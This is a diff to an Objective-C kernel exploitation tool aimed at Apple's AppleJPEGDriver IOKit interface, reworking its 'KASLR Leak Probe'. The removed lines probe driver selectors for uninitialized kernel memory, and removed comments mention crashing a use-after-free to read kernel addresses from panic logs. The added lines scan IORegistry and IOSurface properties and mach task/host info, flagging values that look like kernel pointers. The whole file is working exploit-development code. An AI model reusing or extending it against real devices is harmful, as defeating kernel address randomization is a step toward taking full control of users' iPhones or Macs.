@@ -79,6 +79,11 @@ kern_return_t IOConnectCallMethod(io_connect_t connect,
                                   void *outputStruct,
                                   size_t *outputStructCnt);
 CFMutableDictionaryRef IOServiceMatching(const char *name);
+kern_return_t IORegistryEntryCreateCFProperties(io_object_t entry,
+                                                CFMutableDictionaryRef *properties,
+                                                CFAllocatorRef allocator,
+                                                uint32_t options);
+CF_EXPORT CFDictionaryRef IOSurfaceCopyAllValues(IOSurfaceRef surface);
 
 // AppleJPEGDriverIOStruct: 0x58 (88) bytes
 // Reverse-engineered from startDecoder (sub_FFFFFE00096470A4) and
@@ -352,11 +357,6 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
 
 #pragma mark - KASLR Leak Probe
 
-// Phase 1: Probe all selectors for kernel pointer output
-// - Sel 0 (getTarget): IOConnectCallMethod with scalar output
-// - Sel 2 (query): scalar output
-// - Sel 4/5 (unknown): 0x1000 struct output — check for uninitialized kernel data
-// Phase 2: No-reclaim UAF crash — get kernel addresses from panic log registers
 - (void)kaslrLeakProbe {
     if (self.running) {
         [self log:@"Already running"];
@@ -401,111 +401,120 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
         uint32_t dstID = IOSurfaceGetID(dstSurf);
 
         // ========================================================
-        // PHASE 1: Probe sel 4/5 AFTER submitting a decode
-        // Sel 4 returned 0xe00002bc (NotReady), not BadArgument.
-        // It might need the driver in active/working state.
+        // PHASE 1: Try non-driver KASLR leak vectors
+        // All selectors return BadArgument/NotReady/zero output.
+        // Try IORegistry properties, IOSurface properties, mach primitives.
         // ========================================================
         [self log:@""];
-        [self log:@"--- Phase 1: Sel 4/5 probe after decode ---"];
+        [self log:@"--- Phase 1: Non-driver KASLR leak vectors ---"];
 
-        // First submit a sync decode to put driver in working state
-        io_connect_t wconn = [self openUC:svc];
-        if (wconn) {
-            AppleJPEGDriverIOStruct input = {0};
-            AppleJPEGDriverIOStruct output = {0};
-            input.sourceID    = srcID;
-            input.field_04    = W * H;
-            input.destID      = dstID;
-            input.field_0C    = W * H * 4;
-            input.width       = W;
-            input.height      = H;
-            input.outWidth    = W;
-            input.outHeight   = H;
-            input.subsampling = 3;
-            input.asyncToken  = 0xDEAD;
-
-            size_t outSize = sizeof(output);
-            kern_return_t kr = IOConnectCallStructMethod(wconn, 1,
-                &input, sizeof(input), &output, &outSize);
-            [self log:@"Warmup decode: kr=0x%x outSize=%zu", kr, outSize];
-
-            // Dump output struct as qwords — kernel may echo back useful data
-            uint64_t *qws = (uint64_t *)&output;
-            [self log:@"  [00] %016llx %016llx", qws[0], qws[1]];
-            [self log:@"  [16] %016llx %016llx", qws[2], qws[3]];
-            [self log:@"  [32] %016llx %016llx", qws[4], qws[5]];
-            [self log:@"  [48] %016llx %016llx", qws[6], qws[7]];
-            [self log:@"  [64] %016llx %016llx", qws[8], qws[9]];
-            [self log:@"  [80] %016llx", qws[10]];
-
-            // Try IOConnectCallMethod (full) on sel 1 — request
-            // scalar output IN ADDITION to struct output
-            {
-                uint64_t sOut[8] = {0};
-                uint32_t sCnt = 8;
-                size_t structSz = sizeof(output);
-                kr = IOConnectCallMethod(wconn, 1,
-                    NULL, 0, &input, sizeof(input),
-                    sOut, &sCnt, &output, &structSz);
-                [self log:@"Sel 1 full: kr=0x%x scCnt=%u stSz=%zu", kr, sCnt, structSz];
-                for (uint32_t si = 0; si < sCnt && si < 8; si++) {
-                    if (sOut[si])
-                        [self log:@"  sc[%u] 0x%016llx", si, sOut[si]];
-                }
-            }
-
-            // Sel 3 (encode) — never tested before
-            {
-                AppleJPEGDriverIOStruct encOut = {0};
-                size_t os = sizeof(encOut);
-                kr = IOConnectCallStructMethod(wconn, 3,
-                    &input, sizeof(input), &encOut, &os);
-                [self log:@"Sel 3 encode: kr=0x%x outSize=%zu", kr, os];
-                if (kr == KERN_SUCCESS) {
-                    uint64_t *qws = (uint64_t *)&encOut;
-                    [self log:@"  [00] %016llx %016llx", qws[0], qws[1]];
-                    [self log:@"  [16] %016llx %016llx", qws[2], qws[3]];
-                }
-            }
-
-            // Sel 6 (async decode) output struct
-            {
-                AppleJPEGDriverIOStruct asyncIn = input;
-                asyncIn.asyncToken = 0xDEADBEEF;
-                AppleJPEGDriverIOStruct asyncOut = {0};
-                size_t os = sizeof(asyncOut);
-                kr = IOConnectCallStructMethod(wconn, 6,
-                    &asyncIn, sizeof(asyncIn), &asyncOut, &os);
-                [self log:@"Sel 6 async: kr=0x%x outSize=%zu", kr, os];
-                if (kr == KERN_SUCCESS || os > 0) {
-                    uint64_t *qws = (uint64_t *)&asyncOut;
-                    [self log:@"  [00] %016llx %016llx", qws[0], qws[1]];
-                    [self log:@"  [16] %016llx %016llx", qws[2], qws[3]];
-                }
-            }
-
-            // Sel 4/5 with all-zero input (different from 0xCC pattern)
-            {
-                uint8_t *inZ = calloc(0x1000, 1);
-                for (int sel = 4; sel <= 5; sel++) {
-                    uint8_t *outBuf = calloc(0x1000, 1);
-                    size_t os = 0x1000;
-                    kr = IOConnectCallStructMethod(wconn, (uint32_t)sel,
-                        inZ, 0x1000, outBuf, &os);
-                    [self log:@"Sel %d (zero in): kr=0x%x outSize=%zu", sel, kr, os];
-                    if (kr == KERN_SUCCESS && os > 0) {
-                        for (size_t off = 0; off + 8 <= os && off < 128; off += 8) {
-                            uint64_t v = *(uint64_t *)(outBuf + off);
-                            if (v)
-                                [self log:@"  [+0x%03zx] 0x%016llx", off, v];
+        // 1a: Dump IORegistry properties of the JPEG service
+        {
+            CFMutableDictionaryRef props = NULL;
+            kr = IORegistryEntryCreateCFProperties(svc, &props,
+                kCFAllocatorDefault, 0);
+            [self log:@"IORegistry props: kr=0x%x, dict=%s",
+                kr, props ? "YES" : "NO"];
+            if (props) {
+                // Convert to NSDictionary for easy iteration
+                NSDictionary *pd = (__bridge_transfer NSDictionary *)props;
+                [self log:@"  %lu entries", (unsigned long)pd.count];
+                // Check each value for kernel-pointer-like patterns
+                for (NSString *key in pd) {
+                    id val = pd[key];
+                    if ([val isKindOfClass:[NSNumber class]]) {
+                        int64_t v = [(NSNumber *)val longLongValue];
+                        if (v != 0) {
+                            uint64_t uv = (uint64_t)v;
+                            uint64_t hi = uv >> 40;
+                            [self log:@"  %@ = 0x%016llx%s",
+                                key, uv,
+                                (hi == 0xfffffe || hi == 0xffffff) ? " *** KP" : ""];
+                        }
+                    } else if ([val isKindOfClass:[NSData class]]) {
+                        NSData *d = (NSData *)val;
+                        if (d.length >= 8) {
+                            uint64_t uv = *(uint64_t *)d.bytes;
+                            uint64_t hi = uv >> 40;
+                            if (hi == 0xfffffe || hi == 0xffffff)
+                                [self log:@"  %@ = data[%lu] 0x%016llx *** KP",
+                                    key, (unsigned long)d.length, uv];
                         }
                     }
-                    free(outBuf);
                 }
-                free(inZ);
             }
+        }
 
-            IOServiceClose(wconn);
+        // 1b: IOSurface property probe
+        {
+            IOSurfaceRef surf = IOSurfaceCreate(
+                (__bridge CFDictionaryRef)@{
+                    (id)kIOSurfaceWidth: @256,
+                    (id)kIOSurfaceHeight: @1,
+                    (id)kIOSurfaceBytesPerElement: @4,
+                    (id)kIOSurfacePixelFormat: @0x42475241,
+                });
+            if (surf) {
+                CFDictionaryRef sp = IOSurfaceCopyAllValues(surf);
+                if (sp) {
+                    NSDictionary *sd = (__bridge_transfer NSDictionary *)sp;
+                    [self log:@"IOSurface props: %lu entries", (unsigned long)sd.count];
+                    for (NSString *key in sd) {
+                        id val = sd[key];
+                        if ([val isKindOfClass:[NSNumber class]]) {
+                            int64_t v = [(NSNumber *)val longLongValue];
+                            if (v != 0) {
+                                uint64_t uv = (uint64_t)v;
+                                uint64_t hi = uv >> 40;
+                                [self log:@"  %@ = 0x%016llx%s",
+                                    key, uv,
+                                    (hi == 0xfffffe || hi == 0xffffff) ? " *** KP" : ""];
+                            }
+                        } else if ([val isKindOfClass:[NSData class]]) {
+                            NSData *d = (NSData *)val;
+                            if (d.length >= 8) {
+                                uint64_t uv = *(uint64_t *)d.bytes;
+                                uint64_t hi = uv >> 40;
+                                if (hi == 0xfffffe || hi == 0xffffff)
+                                    [self log:@"  %@ = data[%lu] 0x%016llx *** KP",
+                                        key, (unsigned long)d.length, uv];
+                            }
+                        }
+                    }
+                }
+                CFRelease(surf);
+            }
+        }
+
+        // 1c: host_info / mach primitives that might leak kernel ptrs
+        {
+            mach_port_t host = mach_host_self();
+            // HOST_VM_INFO64 = 5, returns vm_statistics64_data_t
+            vm_statistics64_data_t vmStat;
+            mach_msg_type_number_t count = HOST_VM_INFO64_COUNT;
+            kr = host_statistics64(host, HOST_VM_INFO64,
+                (host_info64_t)&vmStat, &count);
+            [self log:@"host_statistics64: kr=0x%x count=%u", kr, count];
+            if (kr == KERN_SUCCESS) {
+                [self log:@"  free=%llu active=%llu inactive=%llu wire=%llu",
+                    vmStat.free_count, vmStat.active_count,
+                    vmStat.inactive_count, vmStat.wire_count];
+            }
+            mach_port_deallocate(mach_task_self(), host);
+        }
+
+        // 1d: task_info TASK_DYLD_INFO — gives dyld load address (user, but useful)
+        {
+            struct task_dyld_info dyldInfo;
+            mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
+            kr = task_info(mach_task_self(), TASK_DYLD_INFO,
+                (task_info_t)&dyldInfo, &count);
+            [self log:@"TASK_DYLD_INFO: kr=0x%x", kr];
+            if (kr == KERN_SUCCESS) {
+                [self log:@"  all_image_info_addr=0x%llx all_image_info_size=%llu",
+                    dyldInfo.all_image_info_addr,
+                    dyldInfo.all_image_info_size];
+            }
         }
 
         // ========================================================
